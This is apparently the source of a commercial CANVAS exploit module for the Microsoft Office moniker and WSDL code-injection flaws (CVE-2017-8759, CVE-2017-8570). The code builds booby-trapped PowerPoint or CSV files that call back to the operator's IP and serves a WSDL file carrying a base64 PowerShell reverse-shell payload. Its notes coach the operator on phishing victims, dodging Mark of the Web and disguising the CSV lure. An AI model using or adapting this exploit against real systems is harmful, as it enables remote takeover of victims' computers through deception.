#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")

# import libs.spkproxy as spkproxy


from tcpexploit import tcpexploit
from libs.canvasos import canvasos
from exploitutils import *
from ExploitTypes.CommandLineExecuter import CommandExploit

from MOSDEF.cc import cc_main, threadsafe_cc_main
from canvasengine import canvas_root_directory
import canvasengine

import random
import string
import struct
import base64
import shutil
import zipfile

from Nodes.mosdef_powershell.mosdef_powershell import *
from canvasengine import canvas_root_directory

NAME                           = "Microsoft Office Moniker/WSDL C# Injection"
DESCRIPTION                    = "Microsoft Office Multi-format Code-executing Document Creator and Server"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "https://office.com"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2017-8759, CVE-2017-8570"
DOCUMENTATION["CVE URL"]       = ""
DOCUMENTATION["References"]    = ["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8759",
                                  "https://twitter.com/buffaloverflow/status/908455053345869825",
                                  "https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/",
                                  "https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html",
                                  "http://justhaifei1.blogspot.com/2017/07/bypassing-microsofts-cve-2017-0199-patch.html",
                                  ]

DOCUMENTATION['Notes']         = """
Send the resulting document to someone and have them open it. If the
target is vulnerable, you will get a Powershell-MOSDEF shell.

IMPORTANT NOTE: the WSDL server needs to listen on port 80. Even if
the URIs are updated with the correct port, the exploit will not
succeed.

MOTW is defined as the "Mark of the Web". In the Windows Operating
System, MOTW is an alternate datastream (whose name is Zone.Information)
that applications are supposed to apply to files that come from any
untrusted source. The ADS contains the name of the zone of the file's
origination. It is used as a hint to applications that they should not
trust the file's contents.

PPSX Notes
----------------------------------------
If this file is tagged with MOTW on the target machine, the exploit
will not work. This will happen if it is downloaded from a remote zone
in IE, for example. If you cannot avoid MOTW, use CSV phishing method
In that case, the user is more likely to click the 'update content'
(or 'edit content') prompt because that is both are not security
warnings, and the file format lends itself to editing. PPSX is a
slideshow format, which is not intended to be edited and is not
treated as such in PowerPoint. However, if you can avoid MOTW, PPSX
requires no interaction whatsoever to work.

You can edit the PPSX (you may need to rename it to PPTX before opening
it in Office) to contain different slide data. As of CEU time, it is
best to not edit the embedded file, as that is how the moniker is
embedded.

CSV Notes
----------------------------------------
Edit the template .csv to contain realistic data. Otherwise, it will
appear to be a blank CSV file upon first glance. If the target has a
comically large monitor, add more rows to make the '#N/A' appear on
a non-visable part of the screen.


Vulnerability Notes
----------------------------------------
As Haifei Li notes, there are two vulnerabilities at work: the moniker
binding issue (where "binding an object to a moniker" means
deserialization in Microsoft's lexicon) and the issue triggered by
instantiation of the class upon deserialization.

NOTE: For reasons implied above, that there are multiple ways a target
could be patched against this issue:
a) .NET updates will close the bug in wsdlparser.cs that allows code
   injection into the remoting class
b) Office updates will disallow binding of the soap:wsdl moniker that
   is necessary to trigger the remoting code compilation

Tested Operating Systems:
* Office 2013 (no patches) - Windows 7 32 bit
"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Clientside"
PROPERTY['ARCH']               = [ ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ]

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        self.use_local_interface = False
        self.clientversion = None
        self.filename = None
        self.version = 1
        self.autoFind = False

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def setVersions(self):
        self.versions = {}
        self.versions[1] = ("MS Word file", None)
        self.versions[2] = ("MS Excel file", None)
        self.versions[3] = ("MS Powerpoint file", None)


    def getargs(self):
        self.getarg("filename")
        if self.filename == "AUTOGENERATE":
            self.filename = None

        self.clientversion   = self.argsDict.get("clientversion_radiobutton_value", self.clientversion)
        if not self.clientversion:
            logging.warning("Client version not found, using version %s" % str(self.versions[1][0]))
            self.clientversion=1
        else:
            logging.info("Client version: %s" % self.clientversion)
            if "Excel" in self.clientversion:
                self.clientversion = 1
                self.file_ext = "csv"
            elif "Powerpoint" in self.clientversion:
                self.clientversion = 2
                self.file_ext = "ppsx"
            elif "Word" in self.clientversion:
                self.clientversion = 3
                self.file_ext = "docx"

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def read_request(self, handle):
        state = 0
        terminator = "\r\n\r\n"

        while state <= 3:
            i = handle.recv(1)
            if i == terminator[state]:
                state += 1
            else:
                state = 0

        return

    def get_replacers(self, text):
        replacers = set([])
        state = 0
        replacer_allowed_chars = ["_"]
        replacer_allowed_chars.extend(string.ascii_letters)

        current = []

        for i in text:
            if state == 0:
                if i == "{":
                    current.append(i)
                    state = 1
            elif state == 1:
                if i.isspace() or i not in replacer_allowed_chars:
                    state = 0
                    if i == "}":
                        current.append(i)
                        if len(current) != 2:
                            replacers.add("".join(current))
                    current = []
                else:
                    current.append(i)

        return replacers

    def random_string(self, chars=5):
        """
        Return a string that contains CHARS number of random alphabetic
        characters.
        """
        choices = []
        for _ in range(chars):
            choices.append(random.choice(string.ascii_letters))

        return "".join(choices)

    def generate_ppsx(self, file_name=None):
        template_path = os.path.join(os.path.dirname(__file__),"Resources","template.ppsx")

        file_path = None
        if not file_name:
            final_path = os.path.join(canvas_root_directory, "slideshow_bob_%d.ppsx" % random.randint(0, 10000))
        else:
            final_path = os.path.join(canvas_root_directory, file_name)

        shutil.copy(template_path, final_path)

        # read the file to do the replacement
        slide_path = 'ppt/slides/_rels/slide1.xml.rels'
        zip_reader = zipfile.ZipFile(template_path)
        # print zip_reader.namelist()
        slide_handle = zip_reader.open(slide_path, "r")
        slide_data = slide_handle.read()

        slide_data = slide_data.replace("EXPLOIT_WSDL_URL", "http://" + self.callback.ip + "/" + self.random_string(10))

        slide_handle.close()

        # subsequently write the modified wsdl to disk
        zip_writer = zipfile.ZipFile(final_path, "w")
        zip_object = zipfile.ZipInfo()
        zip_object.filename = slide_path

        # ensure rw-rw-rw
        zip_object.external_attr = 0666 << 16L
        zip_object.compress_type = zipfile.ZIP_DEFLATED

        zip_writer.comment = zip_reader.comment

        for zobject in zip_reader.infolist():
            if not zobject.filename.endswith(slide_path):
                zip_writer.writestr(zobject,
                                    zip_reader.read(zobject.filename))
            else:
                zip_writer.writestr(zip_object, slide_data)

        zip_reader.close()
        zip_writer.close()


        return final_path

    def generate_csv(self, file_name=None):
        csv_data = None

        file_path = None
        if not file_name:
            final_path = os.path.join(canvas_root_directory, "csvengeance_%d.csv" % random.randint(0, 10000))
        else:
            final_path = os.path.join(canvas_root_directory, file_name)

        logging.info("Final_path: " + final_path)

        csv_data = None
        with open(os.path.join(os.path.dirname(__file__), "Resources", "template.csv"), "rb") as handle:
            csv_data = handle.read()

        logging.info("Csv_data: " + csv_data)
        csv_data = csv_data.replace("EXPLOIT_WSDL_URL", "http://" + self.callback.ip + "/" + self.random_string(10))

        with open(final_path, "wb") as handle:
            handle.write(csv_data)

        return final_path

    def generate_wsdl(self):
        wsdl_template = None

        ps_mosdef = mosdef_powershell(self)

        powershell_string =  ps_mosdef.createMosdefCallback()
        b64_ps = base64.b64encode(powershell_string)

        with open(os.path.join(os.path.dirname(__file__), "Resources", "wsdl_template"), "rb") as handle:
            wsdl_template = handle.read()

        replacers = self.get_replacers(wsdl_template)

        # need one of these two to trigger RemotingClientProxy
        # generation
        object_types = ["MarshalByRefObject", "ServicedComponent"]
        serialize_types = ["class", "struct"]

        ignored_replacers = ["{powershell_mosdef}",
                             "{object_type}",
                             "{serialize_type}"]

        for replacer in replacers:
            if replacer not in ignored_replacers:
                wsdl_template = wsdl_template.replace(replacer, self.random_string(5))
            elif replacer == "{powershell_mosdef}":
                wsdl_template = wsdl_template.replace("{powershell_mosdef}", b64_ps)
            elif replacer == "{object_type}":
                wsdl_template = wsdl_template.replace("{object_type}",
                                                      random.choice(object_types))
            elif replacer == "{serialize_type}":
               wsdl_template = wsdl_template.replace("{serialize_type}", random.choice(serialize_types))

        return wsdl_template

    def set_up_webserver(self, wsdl_data):
        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = 80
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["sourcedata"] = wsdl_data
        ret = app.listen()
        self.server = app
        return ret

    def run(self):
        self.getargs()
        self.host = self.target.interface

        if self.clientversion == 1:
            csv_path = self.generate_csv(self.filename)
            logging.info("Dropping malicious CSV file to CANVASROOT:")
            logging.info(csv_path)
        elif self.clientversion == 2:
            doc_path = self.generate_ppsx(self.filename)
            logging.info("Dropping malicious PPSX file to CANVASROOT:")
            logging.info(doc_path)

        wsdl_data = self.generate_wsdl()

        logging.info("Starting the malicious WSDL server...")
        try:
            self.set_up_webserver(wsdl_data)
        except Exception as e:
            logging.error("Unable to set up webserver - could not bind on port 80")
        else:
            while  self.state != "HALT":
                self.server.accept()

        logging.info("Done")


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
